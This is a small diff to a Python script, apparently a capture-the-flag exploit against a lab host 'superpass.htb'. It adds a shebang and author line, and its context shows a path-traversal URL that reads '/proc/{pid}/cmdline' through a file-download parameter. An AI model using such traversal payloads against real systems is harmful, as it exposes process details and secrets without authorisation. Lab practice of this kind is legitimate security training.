@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+# Author: Hack.You
 import requests
 
 url = 'http://superpass.htb/download?fn=../proc/{}/cmdline'
